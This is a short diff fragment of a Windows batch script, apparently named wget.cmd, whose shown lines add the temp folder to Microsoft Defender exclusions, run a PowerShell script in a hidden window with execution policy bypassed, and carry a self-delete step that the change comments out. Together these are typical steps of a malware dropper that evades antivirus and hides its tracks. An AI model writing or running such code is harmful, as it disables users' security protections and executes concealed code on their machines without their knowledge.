@@ -36,4 +36,4 @@ Add-MpPreference -ExclusionPath "$env:temp"
 powershell powershell.exe -windowstyle hidden -ep bypass ./wget.ps1
 
 @REM self delete
-del wget.cmd
+@REM del wget.cmd
